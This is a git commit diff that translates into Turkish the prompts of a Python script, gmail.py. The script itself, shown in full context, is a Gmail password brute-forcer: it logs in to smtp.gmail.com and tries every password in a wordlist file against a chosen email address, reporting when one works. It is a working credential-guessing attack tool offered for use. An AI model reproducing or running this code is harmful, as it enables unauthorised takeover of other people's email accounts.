cfa8547415eb6eeed9b377c0aee5a481683e2713
can_s_officiall <50926214+cansofficall@users.noreply.github.com>
2023-08-04 11:01:22 +0300

    Update gmail.py

--- gmail.py
+++ gmail.py
@@ -15,14 +15,14 @@ __      _____| |__   ___ _ __  ___
 
 Yasser = smtplib.SMTP_SSL("smtp.gmail.com",465)
 Yasser.ehlo()
-email = input ("\033[1;35m Enter Your Email : ")
-passfile = input ("\033[1;35m Enter Your passfile : ")
+email = input ("\033[1;35m Email Adresinizi Girin  : ")
+passfile = input ("\033[1;35m Dosya Yolu : ")
 passfile = open (passfile ,"r")
 for password in passfile:
     try:
         time.sleep(2)
         Yasser.login(email, password)
-        print("\033[1;32m password Found ==> " ,password)
+        print("\033[1;32m Parola Bulundu ==> " ,password)
         break
     except smtplib.SMTPAuthenticationError:
-        print("\033[1;31m password Not Found ==> " ,password)
+        print("\033[1;31m Parola Bulunamadi ==> " ,password)
